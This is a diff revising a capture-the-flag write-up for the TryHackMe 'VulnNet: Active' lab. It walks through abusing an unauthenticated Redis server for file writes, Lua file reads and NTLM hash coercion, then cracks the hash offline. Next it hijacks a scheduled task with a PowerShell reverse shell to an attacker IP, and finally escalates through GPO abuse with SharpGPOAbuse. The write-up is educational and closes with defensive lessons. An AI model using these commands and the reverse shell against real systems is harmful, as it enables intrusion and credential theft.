@@ -1,27 +1,26 @@
 # TryHackMe — VulnNet: Active
 
-**Room:** VulnNet: Active
-**Difficulty:** Medium
-**Operating System:** Windows
-**Made by:** @SkyWaves
+**Room:** VulnNet: Active | **Difficulty:** Medium | **OS:** Windows / Active Directory
+**Author:** @SkyWaves
+**Tags:** `Active Directory` `Redis` `Lua Scripting` `NetNTLM` `Responder` `Scheduled Task Hijack` `BloodHound` `GenericWrite` `GPO Abuse` `SharpGPOAbuse`
 
 ---
 
-## ![Local Image](./assets/2.png)
+## ![Room Banner](./assets/2.png)
 
 ---
 
-## Context
+## Overview
 
-VulnNet Entertainment had a bad time with their previous network which suffered multiple breaches. Now they moved their entire infrastructure and hired you again as a core penetration tester. Your objective is to get full access to the system and compromise the domain.
+A Windows Active Directory engagement starting from zero credentials against a domain member server. The attack chain exploits an unauthenticated Redis instance to read files and coerce a NetNTLMv2 hash via Lua scripting, cracks the credentials offline, then abuses a writable scheduled task script for initial access. Privilege escalation is achieved through a BloodHound-discovered `GenericWrite` ACL over a domain-linked GPO, weaponised with SharpGPOAbuse.
 
 ---
 
 ## Phase 1 — Reconnaissance
 
-### Start with Nmap
+### Nmap Full-Port Scan
 
-This time `-p-` to scan all 65535 ports. On a medium-difficulty room you never know what is hiding on a high port.
+Full port scan to avoid missing services on non-standard high ports.
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -50,28 +49,15 @@ Host script results:
 |_    Message signing enabled and required
 ```
 
-### Reading the Scan
+**Reading the scan by what's missing:** Port 88 (Kerberos), 389/636 (LDAP), and 3268/3269 (Global Catalog) are all absent. This is not a Domain Controller — it is a domain member server. That immediately eliminates DCSync, Kerberoasting, AS-REP Roasting, and any LDAP-based enumeration against this host.
 
-The first step in analyzing a Windows scan is identifying what’s **missing**, not just what’s exposed. In this case, several key services are absent:
+SMB signing is required, ruling out relay attacks. SMBv3.1.1 eliminates EternalBlue.
 
-- **Port 88 (Kerberos)** — not open, indicating this host is very **unlikely** to be the **Domain Controller**.
-- **Ports 3268/3269 (Global Catalog)** — also absent, further confirming it is not a DC.
-- **Ports 389/636 (LDAP)** — closed, meaning LDAP-based enumeration is **not possible** here (e.g., BloodHound ingestion or `ldapsearch` for user enumeration).
-
-And reading the SMB output:
-
-- **`Message signing enabled and required`** — **SMB relay** is completely off the table.
-- **SMB 3.1.1** — EternalBlue and every other SMBv1 exploit is gone.
-
-> So before even touching a tool, we already know: no DCSync, no Kerberoasting, no AS-REP Roasting, no relay, no legacy SMB exploits. Classic AD enumeration is heavily limited by design here.
-
-What immediately stands out instead is **port 6379 — Redis 2.8.2402**. That version number is old. Very old. And it is sitting wide open. That is going to be our angle.
+What stands out instead is **port 6379 — Redis 2.8.2402**. That version is outdated, and it is exposed with no authentication. This is the primary attack surface.
 
 ---
 
-## Phase 2 — SMB Enumeration (Confirming the Null Session Story)
-
-Let's see what we can do with a null session using enum4linux:
+## Phase 2 — SMB Enumeration
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -96,18 +82,11 @@ Derived membership: domain member
 [-] SMB connection error: STATUS_ACCESS_DENIED
 ```
 
-Immediately adding to `/etc/hosts`:
-
 ```
 10.114.179.221    VULNNET-BC3TCK1SHNQ.vulnnet.local  vulnnet.local  VULNNET-BC3TCK1
 ```
 
-Null session **partially works**, anonymous bind succeeds on SMB/RPC, leaking the domain name, computer name, and domain SID. But anything deeper : users, groups, shares, policies all come back `STATUS_ACCESS_DENIED`.
-Typical behavior when **SMB signing is required** and there is **no valid session key** to back up **the higher-privilege RPC calls**.
-
-Also worth noting: **domain member** is confirmed. This is not a DC. It is a workstation or member server sitting inside the `VULNNET` domain. That rules out any DC-specific attacks against this IP (e.g., DCSync).
-
-Let's try RID brute-forcing while we're at it:
+Anonymous bind succeeds and leaks the domain name, FQDN, and domain SID. Every deeper RPC call — users, groups, shares, policies — returns `STATUS_ACCESS_DENIED`. RID brute-force hits the same wall:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -116,26 +95,20 @@ SMB  10.114.179.221  445  VULNNET-BC3TCK1  [+] vulnnet.local\: (Null Auth:True)
 SMB  10.114.179.221  445  VULNNET-BC3TCK1  [-] Error: STATUS_ACCESS_DENIED
 ```
 
-Same story. RID enumeration needs `POLICY_LOOKUP_NAMES` and `SAMR_ENUM_USERS` rights, Windows explicitly denies those to anonymous tokens. No user list this way.
+`POLICY_LOOKUP_NAMES` and `SAMR_ENUM_USERS` rights are explicitly denied to anonymous tokens. The SMB surface is exhausted. Pivoting to Redis.
 
 ---
 
 ## Phase 3 — Redis: Unauthenticated Access & Arbitrary File Write
 
-### What is Redis and Why We Care
+### Establishing Access
 
-Redis (Remote Dictionary Server) is an in-memory key-value store. Think of it as a notebook for applications. The dangerous part is not the data it stores, it is the fact that Redis can **save its in-memory data to a file on disk** (called an RDB dump). And because this version has no password and no access controls, **we can tell Redis exactly where to save that file, what to call it, and what to put in it**.
-
-That is an arbitrary file write primitive, and we control it entirely.
-
-Connect first:
+Redis is an in-memory key-value store that can persist data to disk via an RDB dump file. The critical property of this version: it accepts `CONFIG SET` commands to redirect both the **output directory** and the **output filename** of that dump — meaning any authenticated client can write arbitrary content to arbitrary paths. On this instance, there is no authentication at all.
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
 └─$ redis-cli -h 10.114.179.221
 ```
-
-Let's dump the full config and see what we are working with:
 
 ```
 10.114.179.221:6379> CONFIG GET *
@@ -151,19 +124,11 @@ Let's dump the full config and see what we are working with:
 (empty array)
 ```
 
-Two critical things from this output:
+Two key findings: `requirepass` is empty (unauthenticated access confirmed), and the working directory reveals the Redis process is running as the domain account **enterprise-security**. Any path writable by that account is reachable.
 
-- `requirepass` is empty — no authentication required.
-- `dir` is `C:\Users\enterprise-security\Downloads\...` — the Redis service is running as the user **enterprise-security**. That user's folder structure is accessible to the Redis process.
+### Startup Folder File Write (Rabbit Hole)
 
-The arbitrary file write is fully confirmed. Redis can now write any file we want, anywhere the `enterprise-security` account has write permissions.
-
-### Writing to the Startup Folder (Didn't Work but worth mentioning)
-
-The most obvious abuse target here: the **Windows Startup folder**.
-Any `.bat` file placed in `C:\Users\enterprise-security\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` will execute automatically when the service account logs in or on reboot.
-
-Run these one by one inside `redis-cli`:
+The most direct abuse target is the Windows Startup folder — `.bat` files placed at `C:\Users\enterprise-security\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` execute automatically at logon.
 
 ```
 CONFIG SET dir "C:\\Users\\enterprise-security\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
@@ -174,25 +139,19 @@ net localgroup administrators new_user /add"
 SAVE
 ```
 
-Let's validate the new user made it:
-
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
 └─$ crackmapexec smb 10.114.179.221 -u new_user -p Password123!
 SMB  10.114.179.221  445  VULNNET-BC3TCK1  [-] vulnnet.local\Taher:Password123! STATUS_LOGON_FAILURE
 ```
 
-The `.bat` did not execute — this lab machine has **no auto-restart** to trigger the Startup payload. Dead end for now, but the file write primitive is real. We just need a better trigger.
+The payload was written successfully but never executed — this lab environment does not auto-restart to trigger Startup items. The arbitrary file write primitive is real; it just needs a better execution trigger.
 
 ---
 
-## Phase 4 — Redis Lua: Reading Files and Leaking the User Flag
+## Phase 4 — Redis Lua: Local File Read → Flag 1
 
-After doing some research, I found something interesting about this old Redis version. Redis 2.8 has a built-in **Lua scripting engine** accessible via the `EVAL` command.
-The Lua `dofile()` function tries to read and execute a file as Lua code. When the file is not valid Lua, Redis throws an error.
-And that error message **leaks the first line of the file**.
-
-We know the Redis service runs as `enterprise-security`, and we know roughly where user flags live. Let's try it:
+Redis 2.8 ships with a built-in Lua scripting engine accessible via `EVAL`. The `dofile()` function attempts to read and execute a file as Lua code. When the target file is not valid Lua, Redis raises an error — and that error message **leaks the first line of the file content**.
 
 ```
 10.114.179.221:6379> EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
@@ -201,30 +160,25 @@ We know the Redis service runs as `enterprise-security`, and we know roughly whe
 
 **Flag 1:** `THM{3eb176aee96432d5b100bc93580b291e}`
 
-No shell needed. The Lua sandbox in this old version is weak, `dofile()` reads local files freely and the error message does the work for us.
+The Lua sandbox in this Redis version does not restrict filesystem access. `dofile()` reads local paths freely, and the error handler inadvertently exfiltrates the file content.
 
 ---
 
-## Phase 5 — Redis Lua: Coercing a NetNTLMv2 Hash
+## Phase 5 — Redis Lua: UNC Path Coercion → NetNTLMv2 Hash Capture
 
-Same `dofile()` trick, but this time instead of pointing at a local file we point at a **UNC path** on our machine.
-When Redis tries to open `\\our_kali_ip\something`, Windows automatically attempts to authenticate to that SMB share using **the current user's credentials NTLM authentication**. Responder catches the hash in flight.
-
-Set up Responder first:
+The same `dofile()` primitive can point at a **UNC path** instead of a local file. When Redis attempts to open `\\<attacker_ip>\share`, Windows' networking stack automatically initiates NTLM authentication — sending the service account's NetNTLMv2 challenge-response to whoever is listening.
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
 └─$ sudo responder -I tun0
 ```
 
-Then back in redis-cli, trigger the UNC connection:
-
 ```
 10.114.179.221:6379> EVAL "dofile('//192.168.129.39/something')" 0
 (error) ERR Error running script: @user_script:1: cannot open //192.168.129.39/something: Permission denied
 ```
 
-The error is expected — what matters is what Responder caught:
+The connection error is expected — what matters is what Responder captured:
 
 ```
 [SMB] NTLMv2-SSP Client   : 10.114.179.221
@@ -232,7 +186,7 @@ The error is expected — what matters is what Responder caught:
 [SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:d13c2d328e0bf186:13E72171C014BE42117E6CA67F5A5B98:0101000000000000...
 ```
 
-**Important note:** This is a **NetNTLMv2 challenge-response hash**, not an NTLM hash. You cannot Pass-the-Hash with it. And since SMB signing is required on this domain, relay is also off the table. The only move is to crack it offline.
+> **Note:** This is a **NetNTLMv2 challenge-response**, not an NTLM hash. Pass-the-Hash is not possible. NTLM relay is also off the table due to SMB signing. Offline cracking is the only viable path.
 
 ### Cracking the Hash
 
@@ -251,11 +205,9 @@ Password for `enterprise-security`: `sand_0873959498`
 
 ---
 
-## Phase 6 — SMB Enumeration & Scheduled Task Abuse
+## Phase 6 — SMB Enumeration & Scheduled Task Hijack
 
-### Enumerating Shares
-
-We have valid credentials now. Let's see what we can reach:
+### Share Enumeration
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -271,7 +223,7 @@ SMB  10.114.179.221  445  VULNNET-BC3TCK1  NETLOGON        READ          Logon s
 SMB  10.114.179.221  445  VULNNET-BC3TCK1  SYSVOL          READ          Logon server share
 ```
 
-Since RDP and WinRM are disabled, and we do not have admin rights to write to `ADMIN$`, tools like `psexec.py` and `wmiexec.py` are off the table. But that `Enterprise-Share` is interesting. Let's look inside:
+No write access to `ADMIN$`, so `psexec.py` and `wmiexec.py` are off the table. RDP and WinRM are also not exposed. The `Enterprise-Share` is the only accessible non-default share.
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -288,16 +240,11 @@ smb: \> get PurgeIrrelevantData_1826.ps1
 rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 ```
 
-This looks like part of a scheduled task that periodically clears the Documents folder. Let's try and abuse it.
+A cleanup script — the naming convention and task structure indicate this runs on a schedule.
 
-### Share Permissions vs NTFS Permissions
+### Share vs NTFS Permissions
 
-CrackMapExec only showed **READ** on `Enterprise-Share` — but that is only the **share-level ACL**. There are actually two layers of permissions:
-
-1. **Share permissions** — what the tool sees: READ.
-2. **NTFS permissions** on the actual folder behind the share — can have Full Control or Modify for the same user, independently.
-
-Let's test if we can actually write:
+CrackMapExec reported only `READ` on `Enterprise-Share`. This reflects the **share-level ACL** only. Windows enforces two independent permission layers: the share ACL and the underlying NTFS ACL. A user can have `READ` at the share boundary but `Modify` or `Full Control` at the NTFS level. Testing directly:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -312,12 +259,11 @@ smb: \> ls
   test                            A     5
 ```
 
-**We can write**. The NTFS permissions are more permissive than the share ACL suggested.
-Now let's replace that `.ps1` with **our own version containing a reverse shell**.
+Write access confirmed. The NTFS permissions are more permissive than the share ACL indicated.
 
 ### Injecting the Reverse Shell
 
-from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources) CheatSheet:
+Replacing the legitimate scheduled task script with a PowerShell reverse shell:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -326,16 +272,12 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.129.39',4444);$stream
 EOF
 ```
 
-Upload it over the legitimate file:
-
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
 └─$ smbclient //10.114.179.221/Enterprise-Share -U vulnnet.local/enterprise-security%sand_0873959498
 smb: \> put PurgeIrrelevantData_1826.ps1
 putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1
 ```
-
-Start the listener and wait for the scheduled task to fire:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -350,17 +292,13 @@ PS C:\Users\enterprise-security\Desktop> type C:\Users\enterprise-security\Deskt
 THM{3eb176aee96432d5b100bc93580b291e}
 ```
 
-Shell confirmed. Flag 1 confirmed again via the filesystem this time.
+Shell established as `enterprise-security`. Flag 1 confirmed via filesystem.
 
 ---
 
-## Phase 7 — BloodHound & GPO Abuse
+## Phase 7 — BloodHound & GPO Abuse → Domain Admin
 
-Now we need to get from `enterprise-security` (standard domain user) to `Administrator`. Let's map the domain first.
-
-### Uploading and Running SharpHound
-
-Upload SharpHound via the share:
+### Domain Data Collection with SharpHound
 
 ```bash
 ┌──(kali㉿kali)-[/opt]
@@ -368,8 +306,6 @@ Upload SharpHound via the share:
 smb: \> put SharpHound.ps1
 putting file SharpHound.ps1 as \SharpHound.ps1 (1573.5 kB/s)
 ```
-
-On the reverse shell:
 
 ```powershell
 PS C:\Enterprise-Share> Import-Module .\SharpHound.ps1
@@ -385,16 +321,12 @@ Mode                LastWriteTime         Length Name
 -a----        4/19/2026   9:35 AM        1308348 SharpHound.ps1
 ```
 
-Download the zip:
-
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
 └─$ smbclient //10.114.179.221/Enterprise-Share -U vulnnet.local/enterprise-security%sand_0873959498
 smb: \> prompt off
 smb: \> get 20260419094020_BloodHound.zip
 ```
-
-Start neo4j and open BloodHound:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -404,26 +336,15 @@ Start neo4j and open BloodHound:
 └─$ /opt/BloodHound-linux-x64/BloodHound --no-sandbox
 ```
 
-Upload the zip, mark `enterprise-security` as owned, and look for the **Shortest Path to Domain Admins** from owned principals.
+### ACL Analysis
 
-## ![Local Image](./assets/1.png)
+Upload the zip, mark `enterprise-security` as owned, and query the shortest path to Domain Admins from owned principals.
 
-The graph tells a clear story: `enterprise-security` has **GenericWrite** over the GPO `SECURITY-POL-VN`, which is linked to the `VULNNET.LOCAL` domain. The `USERS` container is inside the domain and contains `DOMAIN ADMINS`.
+## ![BloodHound Graph](./assets/1.png)
 
-**GenericWrite on a GPO** means we can modify that GPO — and since GPOs apply policy to machines and users in scope, we can inject a malicious scheduled task that will execute on affected systems. This is a full domain-level privilege escalation path.
-
-BloodHound's built-in **help text** on GenericWrite over GPOs confirms it:
-
-```
-With GenericWrite over a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO.
-Use an evil policy that allows item-level targeting, such as a new immediate scheduled task.
-```
+`enterprise-security` holds **GenericWrite** over the GPO `SECURITY-POL-VN`, which is linked directly to the `VULNNET.LOCAL` domain. GenericWrite on a GPO grants the ability to modify its contents — including injecting a new Immediate Scheduled Task. Since GPOs apply to all computer objects in scope, a malicious task pushed through this GPO executes on affected machines under a privileged context, making this a domain-wide escalation path from a single user-level permission.
 
 ### Exploiting GenericWrite with SharpGPOAbuse
-
-There is a tool built exactly for this: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).
-
-Download and upload it via the share:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -432,8 +353,6 @@ Download and upload it via the share:
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
 └─$ smbclient //10.114.179.221/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' -c 'put SharpGPOAbuse.exe'
 ```
-
-On the reverse shell, we add a new **Computer Immediate Task** to the `SECURITY-POL-VN` GPO that adds our user to the local Administrators group:
 
 ```powershell
 PS C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
@@ -449,7 +368,7 @@ PS C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug"
 [+] Done!
 ```
 
-Now force the GPO refresh immediately instead of waiting:
+Force immediate GPO application rather than waiting for the default refresh interval:
 
 ```powershell
 PS C:\Enterprise-Share> gpupdate /force
@@ -459,7 +378,7 @@ Computer Policy update has completed successfully.
 User Policy update has completed successfully.
 ```
 
-Confirm we are now in the Administrators group:
+### Confirming Local Admin
 
 ```powershell
 PS C:\Enterprise-Share> net user enterprise-security
@@ -469,13 +388,11 @@ Global Group memberships     *Domain Users
 The command completed successfully.
 ```
 
-We are local admin.
-
 ---
 
-## Phase 8 — Grabbing the Final Flag
+## Phase 8 — Final Flag
 
-Our current reverse shell still has the old security token from before the privilege escalation — the group memberships are cached from the previous logon session. Rather than waiting or spinning up a new shell, we can directly access the `C$` administrative share with our new admin rights and pull the flag:
+The existing reverse shell retains the security token from the original logon session — group membership changes do not apply until a new token is issued. Rather than spawning a new shell, the `C$` administrative share can be accessed directly over SMB using the now-elevated credentials:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
@@ -490,19 +407,34 @@ THM{d540c0645975900e5bb9167aa431fc9b}
 
 ---
 
-## Closing Thoughts
+## Attack Chain Summary
 
-What makes this room interesting is the attack chain starts somewhere you might not expect to see in an AD engagement — a forgotten Redis instance with no password sitting next to a bunch of SMB services. It is a good reminder that AD hardening does not mean much if there is an unauthenticated service running on the same box that can write arbitrary files and leak credentials via Lua scripting.
-
-The GPO abuse path at the end is also worth studying. **GenericWrite on a GPO is easily as dangerous as GenericAll on a user** — you are not modifying a single account, you are pushing policy to **every computer object in scope**.
-In a real environment that could mean full domain compromise from a single user-level permission misconfiguration, and it is the kind of edge that gets overlooked in permission audits because it lives in **Group Policy rather than user/group ACLs**.
-
-Thanks for reading.
+| Phase                 | Technique                                      | Outcome                                                            |
+| --------------------- | ---------------------------------------------- | ------------------------------------------------------------------ |
+| Reconnaissance        | Nmap full-port scan                            | Domain member server identified; Redis 2.8 exposed unauthenticated |
+| SMB Enumeration       | Null session, RID brute                        | Domain name/FQDN leaked; no user enumeration possible              |
+| Redis — File Write    | `CONFIG SET dir/dbfilename` + `SAVE`           | Arbitrary file write primitive confirmed                           |
+| Redis — File Read     | `EVAL dofile()` (Lua)                          | Flag 1 read via error message leak                                 |
+| Redis — Hash Coercion | `EVAL dofile('//attacker_ip/...')` + Responder | NetNTLMv2 hash for `enterprise-security` captured                  |
+| Hash Cracking         | John the Ripper (rockyou)                      | `enterprise-security` password recovered                           |
+| Share Enumeration     | CrackMapExec + smbclient                       | `Enterprise-Share` identified; NTFS write confirmed                |
+| Scheduled Task Hijack | PowerShell reverse shell replacing `.ps1`      | Shell as `enterprise-security`                                     |
+| Domain Mapping        | SharpHound + BloodHound                        | `GenericWrite` over `SECURITY-POL-VN` GPO identified               |
+| GPO Abuse             | SharpGPOAbuse `--AddComputerTask`              | `enterprise-security` added to local Administrators                |
+| Flag Retrieval        | SMB `C$` access                                | System flag retrieved                                              |
 
 ---
 
-_Raw .md file available on GitHub: [https://github.com/MohamedTaherBorgi/Writeups](https://github.com/MohamedTaherBorgi/Writeups)_
+## Key Takeaways
+
+The initial access chain here illustrates how a single misconfigured ancillary service can undermine an otherwise hardened AD environment. Redis with no authentication and no network-level restriction is an arbitrary file write and credential coercion primitive by default — the Lua `dofile()` UNC trick is particularly effective because it requires no exploit code, just a single command that triggers Windows' built-in NTLM authentication stack.
+
+The distinction between share-level and NTFS permissions is a practical point worth internalising. Automated tooling reports what the share ACL allows; the NTFS layer is a separate check that can only be confirmed by attempting the action directly. Assuming share permissions are the ceiling is a common enumeration shortcut that leaves real access on the table.
+
+The GPO abuse path demonstrates why `GenericWrite` on a Group Policy Object is frequently underweighted in permission audits. Unlike `GenericAll` on a user, which affects a single account, write access to a GPO with broad scope is a domain-wide escalation primitive — every computer object the policy applies to becomes an execution target. It warrants the same severity classification as direct Domain Admin-adjacent ACLs.
 
 ---
 
-**Tags:** `TryHackMe` `Active Directory` `Redis` `NetNTLM` `Responder` `BloodHound` `GenericWrite` `GPO Abuse` `SharpGPOAbuse`
+_Writeup repository: [https://github.com/MohamedTaherBorgi/Writeups](https://github.com/MohamedTaherBorgi/Writeups)_
+
+**Tags:** `TryHackMe` `Active Directory` `Redis` `Lua Scripting` `NetNTLM` `Responder` `Scheduled Task Hijack` `BloodHound` `GenericWrite` `GPO Abuse` `SharpGPOAbuse`
